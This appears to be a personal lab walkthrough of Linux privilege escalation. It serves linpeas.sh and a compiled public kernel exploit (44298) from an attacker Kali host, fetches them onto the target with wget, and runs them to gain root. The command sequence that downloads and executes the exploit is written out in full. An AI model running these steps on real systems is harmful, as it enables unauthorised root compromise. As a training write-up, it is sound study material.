Privilege Escalation

Privilege Escalation

# Works
1. On Kali machine, go to the directory where linpeas.sh is stored, then create a python server
`python -m SimpleHTTPServer 5678`
![602ce5fd02a506063ac8ffe28c0703ca.png](../../_resources/3a97b61490234990a7405c9d71a06538.png)

2. On the target, download linpeas.sh to the target's /tmp directory using wget
`wget http://192.168.119.214:5678/linpeas.sh /tmp`
![c1c55ed2ebdb3d6287fb961fd5b9d37c.png](../../_resources/cf8c5c925ead43d0994c4cd9fb8a5448.png)

3. Notice that the netcat listener on Kali should show the GET request from the target 
![bf23de88ba4c3b82e509e5dc2891e9fa.png](../../_resources/450592bdb87f44dcb746bcc3fd91e260.png)

4. Change the permissions so that linpeas.sh can be executed
`chmod +x linpeas.sh`
![18aff38436cae8ac49a7848fcb75a24b.png](../../_resources/25ddb6396d1d46b4b0dc6552fe2e3c09.png)

5. Run linpeas.sh and redirect to a file.
`./linpeas.sh > linout.txt`
![ede281227540c1b7ccddeea1ffcddaa0.png](../../_resources/7a9fad693a81410aaf7b93470470155d.png)

6. The first item that absolutely must be looked at is the OS. It is Linux version 4.4.0-116-generic.
![2ba16b0aa67ba4c3ef9eaa0eefb6e76e.png](../../_resources/d8cfddb2e2d04654b528ec8218c8fa28.png)

7. Searchsploit 'Ubuntu 4.4.0-116' and download
`searchsploit ubuntu 4.4.0-116`
`searchsploit -m 44298`
8. Compile the exploit
`gcc 44298.c -o exploit`
![79c189655ceb919ca06edcf0d60a1b16.png](../../_resources/a015f3a2a8a34455b862cfba9cc3c5f7.png)

9. Run the python simple server command in the directory where the compiled exploit is located
`python -m SimpleHTTPServer 5678`
![40c7c5ea352a0ed94070ef60c2b4b64b.png](../../_resources/87e53c6b94e741c19eb6f1bcffa8ef4f.png)

10. From the target, download the exploit using wget
`wget http://192.168.119.214:5678/exploit`
![3cc4066727d728acb552d2fc52b0fcf1.png](../../_resources/531530cd83e04abaadb0f27e4f59c215.png)

11.Change the permissions to make it executable
`chmod +x exploit`
![4fc76b88ed9f7b2bf8550c8f761a0b68.png](../../_resources/6443b2e2f55c4ed6b03532bc2cac0098.png)

12. Run the exploit, we are now root!
`./exploit`
![9569cfc74dfa7307fdbc1dabdd0b8d53.png](../../_resources/10c11b6c93674b2d885726b26cdf6d8c.png)









